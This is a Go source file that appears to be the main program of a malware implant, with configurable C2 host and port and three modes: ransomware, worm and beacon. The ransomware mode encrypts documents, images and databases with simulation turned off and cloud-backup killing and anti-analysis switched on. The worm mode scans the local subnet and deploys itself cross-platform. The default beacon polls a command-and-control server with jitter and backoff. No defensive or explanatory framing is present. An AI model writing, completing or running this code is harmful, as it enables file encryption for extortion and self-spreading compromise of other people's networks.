package main

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/ruby570bocadito/x404x/internal/ransomware"
)

var (
	C2Host      = "localhost"
	C2Port      = "8443"
	PayloadType = "shell"
	Stealth     = "false"
	KillSwitch  = "disable"
)

const (
	beaconBaseInterval = 30 * time.Second
	beaconJitterMax    = 15 * time.Second
	maxBackoff         = 5 * time.Minute
	reconnectBase      = 2 * time.Second
)

func main() {
	if Stealth == "true" {
		jitterSleep(3*time.Second, 5*time.Second)
	}

	c2Addr := fmt.Sprintf("%s:%s", C2Host, C2Port)

	switch PayloadType {
	case "ransomware":
		runRansomware(c2Addr)
	case "worm":
		runWorm(c2Addr)
	default:
		runBeacon(c2Addr)
	}
}

func runRansomware(c2 string) {
	if KillSwitch == "enable" {
		return
	}

	cfg := &ransomware.RansomwareConfig{
		EncryptExtensions:     []string{".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".sql", ".db", ".ppt", ".pptx"},
		ExcludePaths:          []string{"Windows", "System32", "boot", "AppData"},
		DoubleEncryptCritical: true,
		ShamirParts:           3,
		ShamirThreshold:       2,
		MaxFileSize:           100 * 1024 * 1024,
		ScanWorkers:           8,
		EncryptWorkers:        4,
		Simulation:            false,
		CloudBackupKill:       true,
		AntiAnalysis:          true,
	}

	engine, err := ransomware.NewEngine(cfg)
	if err != nil {
		os.Exit(1)
	}

	ctx := context.Background()
	host, _ := os.Hostname()
	companyName := strings.ToUpper(host) + " CORP"

	_, err = engine.Execute(ctx, "camp_payload_build", companyName)
	if err != nil {
		os.Exit(1)
	}
}

func runWorm(c2 string) {
	cfg := &ransomware.RansomwareConfig{}
	worm := ransomware.NewMultiPlatformWorm(cfg)

	subnet := detectSubnet()
	hosts := worm.ScanNetwork(subnet)

	if len(hosts) > 0 {
		worm.DeployCrossPlatform(hosts)
	}
}

func runBeacon(c2 string) {
	backoff := reconnectBase
	for {
		if isC2Reachable(c2) {
			backoff = reconnectBase
			jitterSleep(beaconBaseInterval, beaconJitterMax)
		} else {
			jitterSleep(backoff, backoff/3)
			backoff = backoff * 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
		}
	}
}

func isC2Reachable(addr string) bool {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func jitterSleep(base, jitter time.Duration) {
	extra := time.Duration(rand.Int63n(int64(jitter)))
	time.Sleep(base + extra)
}

func detectSubnet() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "10.0.0.0/24"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			mask := ipnet.Mask
			ip := ipnet.IP.To4()
			network := net.IP(make([]byte, 4))
			for i := range network {
				network[i] = ip[i] & mask[i]
			}
			ones, _ := mask.Size()
			return fmt.Sprintf("%d.%d.%d.%d/%d", network[0], network[1], network[2], network[3], ones)
		}
	}
	return "10.0.0.0/24"
}
